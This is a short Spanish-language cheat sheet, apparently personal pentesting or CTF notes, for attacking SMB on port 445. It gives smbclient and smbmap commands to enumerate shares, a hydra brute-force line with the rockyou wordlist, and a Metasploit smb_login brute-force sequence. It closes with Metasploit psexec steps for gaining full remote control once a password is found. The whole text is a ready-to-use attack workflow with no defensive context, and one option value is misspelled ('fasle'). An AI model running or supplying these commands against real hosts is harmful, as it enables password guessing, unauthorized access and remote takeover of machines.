*port:445*

 * Enumerar recursos compartidos sin contraseña
```
smbclient -L <IP> -N
```

* Ataque de fuerza bruta para obtener la contraseña
```
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt smb://<IP>
```

* Enumerar recursos compartidos con contraseña
```
smbclient -L //<IP> -U '<usuario>'
```

* Enumerar recursos compartidos con contraseña pero para saber que permisos tengo en cada recurso
```
smbmap -H <IP> -u '<usuario>' -p '<contraseña>'
```

* Entrar dentro de un recurso compartido
```
smbclient -U 'usuario' //<IP>/<nombre del recurso compartido>
```

--- 
# Fuerza bruta con Metasploit

* `search smb_login`
* `set RHOSTS <IP>`
* `set VERBOSE fasle`
* `set SMBUser <usuario>`
* `set PASS_FILE /usr/share/wordlists/rockyou.txt`
* `run`
---
## OPCIONAL

Cuando obtengamos la contraseña hay que intentar esto con Metasploit para tener control remoto total de la máquina (A veces no funciona)
+ `use exploit/windows/smb/psexec`
+ `set RHOST <IP>`
+ `set SMBUser <usuario>`
+ `set SMBPass <contraseña>`
+ `run`